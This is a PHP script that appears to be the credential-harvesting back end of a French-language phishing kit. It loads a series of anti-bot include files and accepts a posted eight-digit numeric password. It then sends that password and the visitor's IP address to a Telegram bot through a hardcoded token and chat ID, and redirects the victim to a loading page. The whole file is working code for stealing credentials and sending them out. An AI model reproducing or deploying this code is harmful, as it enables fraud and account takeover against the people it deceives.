<?php
include '../src/antibots.php';
include '../antibots.php';
include '../anti/anti1.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti7.php';
include '../anti/anti8.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];

    if (strlen($password) !== 8 || !is_numeric($password)) {
        die('Mot de passe invalide.');
    }

    // Infos Telegram
    $botToken = "8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ";
    $chatID = "8134069302";

    // Message bien formaté
    $message  = "<b>🔐 Nouveau mot de passe reçu :</b>\n\n";
    $message .= "<b>🔑 Mot de passe :</b> <code>" . $password . "</code>\n";
    $message .= "<b>🌐 IP :</b> <code>" . $ip . "</code>";

    // Envoi du message via Telegram API
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($message) . "&parse_mode=HTML";
    
    // Envoi
    $response = file_get_contents($url);

    // Redirection
    if ($response) {
        header("Location: ../chargement.php");
    } else {
        header("Location: ../chargement.php");
    exit;
    }
}
?>
